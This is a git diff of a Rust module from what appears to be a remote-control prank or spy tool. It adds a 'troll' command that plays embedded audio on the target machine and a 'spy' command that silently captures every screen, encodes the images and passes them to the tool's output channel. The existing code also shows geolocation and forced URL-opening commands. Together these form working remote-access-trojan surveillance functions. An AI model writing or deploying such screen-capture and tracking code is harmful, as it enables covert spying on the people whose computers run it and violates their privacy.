@@ -1,6 +1,10 @@
-use crate::core::{ Args, OutFun, Output, Text }; // TODO: Add Media if you get any issue in the media_output macro.
+#[allow(unused)]
+use crate::core::{ Args, OutFun, Output, Text, Media };
 
 pub use rand::Rng;
+
+#[allow(unused)]
+use crate::data;
 
 #[cfg(feature = "troll")]
 pub use open;
@@ -9,6 +13,17 @@ pub use open;
 use serde::Deserialize;
 #[cfg(feature = "spy")]
 use reqwest::blocking::get;
+#[cfg(feature = "spy")]
+use screenshots::{ Screen, image };
+#[cfg(feature = "spy")]
+use std::io::Cursor;
+#[cfg(feature = "spy")]
+use base64::encode;
+
+#[cfg(feature = "troll")]
+use base64::decode;
+#[cfg(feature = "troll")]
+use rodio::{ OutputStream, source::Source };
 
 #[macro_use]
 mod helpers {
@@ -20,7 +35,7 @@ mod helpers {
 
     macro_rules! media_output {
         ($out:ident, $name:expr, $data:expr) => {
-        $out(Output::Media(Media { name: $name, data: $data.to_string() }))
+        $out(Output::Media(Media { name: $name.to_string(), data: $data.to_string() }))
         };
     }
 }
@@ -53,6 +68,32 @@ pub fn rickroll(_args: Args, out: OutFun) {
         text_output!(out, format!("ERROR opening url: {}", err));
     }
     text_output!(out, format!("Opened url: {}", url));
+}
+
+#[cfg(feature = "troll")]
+pub fn fart(_args: Args, out: OutFun) {
+    let audio_bytes = match decode(data::FART) {
+        Ok(bytes) => bytes,
+        Err(err) => {
+            text_output!(out, format!("Error decoding base64 data: {}", err));
+            return;
+        }
+    };
+    text_output!(out, "Farting...");
+    let (_stream, stream_handle) = OutputStream::try_default().unwrap();
+
+    let source = rodio::Decoder::new(std::io::Cursor::new(audio_bytes)).unwrap();
+
+    match stream_handle.play_raw(source.convert_samples()) {
+        Ok(_) => {}
+        Err(err) => {
+            text_output!(out, format!("Error playing audio: {}", err));
+            return;
+        }
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(1));
+    text_output!(out, "Farted!");
 }
 
 #[cfg(feature = "spy")]
@@ -104,4 +145,38 @@ pub fn location(_args: Args, out: OutFun) {
             geolocation.lon
         )
     );
+}
+
+#[cfg(feature = "spy")]
+pub fn screenshot(_args: Args, out: OutFun) {
+    let screens = match Screen::all() {
+        Ok(screens) => screens,
+        Err(err) => {
+            text_output!(out, format!("Error getting screens: {}", err));
+            return;
+        }
+    };
+    for screen in screens {
+        let image = match screen.capture() {
+            Ok(image) => { image }
+            Err(err) => {
+                text_output!(out, format!("Error capturing screenshot: {}", err));
+                return;
+            }
+        };
+        let mut buffer = Vec::new();
+        let mut cursor = Cursor::new(&mut buffer);
+
+        // Write the image data to the buffer
+        match image.write_to(&mut cursor, image::ImageOutputFormat::Png) {
+            Ok(_) => {
+                let base64_data = encode(&buffer);
+                text_output!(out, "Outputting screenshot");
+                media_output!(out, "screenshot.png", base64_data);
+            }
+            Err(err) => {
+                text_output!(out, format!("Error writing to buffer: {}", err));
+            }
+        }
+    }
 }
